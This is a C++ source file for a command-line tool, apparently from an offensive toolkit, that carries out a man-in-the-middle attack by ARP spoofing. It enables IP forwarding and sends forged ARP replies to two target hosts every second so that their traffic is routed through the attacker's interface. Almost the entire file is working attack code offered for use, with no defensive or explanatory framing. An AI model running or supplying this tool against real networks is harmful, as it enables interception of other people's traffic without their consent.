#include "../../utils/inc/ip.h"
#include <CLI/CLI.hpp>
#include <cstdio>
#include <iostream>
#include <thread>
#include <chrono>

using namespace std;

bool verbose = false;

// **********************
void startArpSpoofing(const string target1_ip, const string target2_ip, string spoofedMac, string interface);
void signalHandler(int signum);
// **********************

int main(int argc, char* argv[]) {
    CLI::App app{"Make man in the middle attack using arp spoofing", "atk arp mitm"};

    // ******** Flag variables ********
    string target1_ip;
    string target2_ip;
    string interface;
    // ********************************

    app.add_flag("-v,--verbose", verbose, "Verbose output");
    app.add_option("-t,--target1", target1_ip, "Target IPv4 address")->required();
    app.add_option("-T,--target2", target2_ip, "Sender IPv4 address")->required();
    app.add_option("-i,--interface", interface, "Interface")->required();

    try {
        app.parse(argc, argv);
    } catch (const CLI::ParseError &e) {
        return app.exit(e);
    }

    // ******** Input validation ********
    if (!checkValidIpv4(target1_ip)) {
        printf("Invalid target IP address: %s\n", target1_ip.c_str());
        return 1;
    }
    if (!checkValidIpv4(target2_ip)) {
        printf("Invalid sender IP address: %s\n", target2_ip.c_str());
        return 1;
    }
    if (!interfaceExists(interface)) {
        printf("Interface does not exist: %s\n", interface.c_str());
        return 1;
    }
    // **********************************

    string spoofedMac = getMacFromInterface(interface);

    if (verbose) {
        printf("Target 1 IP: %s\n", target1_ip.c_str());
        printf("Target 2 IP: %s\n", target2_ip.c_str());
        printf("Interface: %s\n", interface.c_str());
        printf("Target mac: %s\n", getMacFromIP(target1_ip).c_str());
        printf("Spoofed mac: %s\n", spoofedMac.c_str());
        cout << "\n";
        cout << "Enabling IP forwarding...\n";
    }

    signal(SIGINT, signalHandler); // Register signal handler for Ctrl+C

    if (!enableIPForwarding()) {
        printf("Failed to enable IP forwarding\n");
        return 1;
    }

    while (true) {
        startArpSpoofing(target1_ip, target2_ip, spoofedMac, interface);
        startArpSpoofing(target2_ip, target1_ip, spoofedMac, interface);
        this_thread::sleep_for(chrono::milliseconds(1000));
    }

    return 0;
}

void startArpSpoofing(const string target1_ip, const string target2_ip, string spoofedMac, string interface) {
    string target_mac = getMacFromIP(target1_ip);

    if (sendARPResponse(target1_ip, target_mac, target2_ip, spoofedMac, interface)) {
        cout << "ARP Response sent to " << target1_ip << endl;
    } else {
        cout << "Error" << endl;
    }
}

void signalHandler(int signum) {
    if (verbose) {
        cout << "Disabling IP forwarding..." << endl;
    }
    if (!disableIPForwarding()) {
        printf("Failed to disable IP forwarding\n");
    }
    exit(signum);
}